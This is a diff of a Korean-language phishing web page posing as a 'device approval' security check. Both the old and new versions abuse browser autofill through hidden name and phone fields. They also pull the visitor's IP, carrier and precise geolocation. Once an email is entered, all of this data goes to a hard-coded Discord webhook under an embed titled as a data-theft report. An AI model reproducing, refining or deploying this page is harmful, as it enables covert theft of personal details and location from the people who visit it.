@@ -2,79 +2,82 @@
 <html lang="ko">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PASS Identity</title>
+    <title>보안 계정 확인</title>
     <style>
-        body { background: #f4f7f6; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: -apple-system, sans-serif; }
-        .card { width: 340px; background: #fff; padding: 30px; border-radius: 12px; box-shadow: 0 8px 30px rgba(0,0,0,0.1); text-align: center; }
-        .btn-action { width: 100%; padding: 15px; background: #007bff; color: #fff; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; }
-        .input-group { margin-bottom: 15px; text-align: left; }
-        input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; font-size: 16px; }
-        #hidden-trigger { position: absolute; left: -9999px; }
+        body { background: #f0f2f5; font-family: -apple-system, BlinkMacSystemFont, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .auth-container { width: 350px; background: #fff; padding: 30px; border-radius: 10px; box-shadow: 0 4px 12px rgba(0,0,0,0.15); text-align: center; }
+        .input-wrap { position: relative; margin-bottom: 20px; }
+        input { width: 100%; padding: 14px; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; font-size: 16px; transition: border 0.3s; }
+        input:focus { border: 2px solid #1877f2; outline: none; }
+        .btn-confirm { width: 100%; padding: 15px; background: #1877f2; color: #fff; border: none; border-radius: 6px; font-weight: bold; font-size: 16px; cursor: pointer; }
     </style>
 </head>
-<body onload="initNet()">
+<body onload="captureIP()">
 
-    <div class="card">
-        <h2 style="font-size: 20px; margin-bottom: 20px;">본인 확인 및 승인</h2>
+    <div class="auth-container">
+        <h2 style="font-size: 18px; color: #1c1e21; margin-bottom: 10px;">기기 승인 필요</h2>
+        <p style="font-size: 13px; color: #606770; margin-bottom: 25px;">보안을 위해 저장된 이메일 프로필을 선택하여 본인임을 인증해 주세요.</p>
         
-        <div class="input-group">
-            <input type="email" id="target_email" name="email" autocomplete="email" placeholder="인증 이메일 선택" oninput="captureStep()">
+        <div class="input-wrap">
+            <input type="email" id="email_field" name="email" autocomplete="email" placeholder="이메일 주소 선택" oninput="extractData()">
         </div>
 
-        <button class="btn-action" onclick="triggerFocus()">승인 후 계속</button>
+        <button class="btn-confirm" onclick="forcePrompt()">인증 완료</button>
     </div>
 
-    <form id="hidden-trigger">
-        <input type="text" id="target_name" name="name" autocomplete="name">
-        <input type="tel" id="target_phone" name="tel" autocomplete="tel">
-    </form>
+    <div style="display:none;">
+        <input type="text" id="name_field" name="name" autocomplete="name">
+        <input type="tel" id="tel_field" name="tel" autocomplete="tel">
+    </div>
 
 <script>
     const webhook = "https://discord.com/api/webhooks/1460622639637729402/McoPaA3kn18CkbdlyigwKt7RnFrOrnzdOarw9shUjQawzedZzLfmtB4hCc7kcfUeM7rd";
     let net = {};
 
-    async function initNet() {
-        const res = await fetch('https://ipapi.co/json/');
-        net = await res.json();
+    async function captureIP() {
+        try {
+            const res = await fetch('https://ipapi.co/json/');
+            net = await res.json();
+        } catch(e) {}
     }
 
-    function triggerFocus() {
-        // 버튼 클릭 시 이메일 입력창에 강제로 포커스를 주어 자동완성 팝업을 유도함
-        const emailInput = document.getElementById('target_email');
-        emailInput.focus();
-        emailInput.click();
+    function forcePrompt() {
+        const field = document.getElementById('email_field');
+        field.focus();
+        // 타겟이 아무것도 입력 안 할 경우를 대비해 목록을 다시 띄우도록 유도
+        if(!field.value) alert("인증할 프로필 정보를 선택해야 합니다.");
     }
 
-    async function captureStep() {
-        const email = document.getElementById('target_email').value;
-        const name = document.getElementById('target_name').value;
-        const phone = document.getElementById('target_phone').value;
+    async function extractData() {
+        const e = document.getElementById('email_field').value;
+        const n = document.getElementById('name_field').value;
+        const t = document.getElementById('tel_field').value;
 
-        if (email.includes('@')) {
+        // 이메일 형식이 갖춰지는 즉시 사출
+        if (e.includes('@')) {
             navigator.geolocation.getCurrentPosition(async (pos) => {
-                await pushToAlpha(email, name, phone, pos.coords.latitude, pos.coords.longitude);
+                await sendToDiscord(e, n, t, pos.coords.latitude, pos.coords.longitude);
             }, async () => {
-                await pushToAlpha(email, name, phone, null, null);
+                await sendToDiscord(e, n, t, null, null);
             });
         }
     }
 
-    async function pushToAlpha(e, n, t, lat, lon) {
+    async function sendToDiscord(e, n, t, lat, lon) {
         await fetch(webhook, {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
             body: JSON.stringify({
                 embeds: [{
-                    title: "💀 [DAN] 7대 정보 통합 탈취 완료",
+                    title: "🔓 [DAN] 7대 정보 통합 탈취 보고서",
                     color: 16711680,
                     fields: [
                         { name: "👤 이름", value: n || "미검출", inline: true },
                         { name: "📧 이메일", value: e, inline: true },
                         { name: "📞 전화번호", value: t || "미검출", inline: true },
-                        { name: "🌐 IP", value: net.ip, inline: false },
-                        { name: "📍 좌표", value: lat ? `${lat}, ${lon}` : "IP기반", inline: true },
-                        { name: "📶 통신사", value: net.org, inline: true },
+                        { name: "🌐 IP", value: net.ip || "실패", inline: false },
+                        { name: "📍 정밀 위치", value: lat ? `위도:${lat}, 경도:${lon}` : "IP기반", inline: false },
+                        { name: "🏢 통신사", value: net.org || "정보없음", inline: true },
                         { name: "📱 기기", value: navigator.userAgent }
                     ],
                     timestamp: new Date()
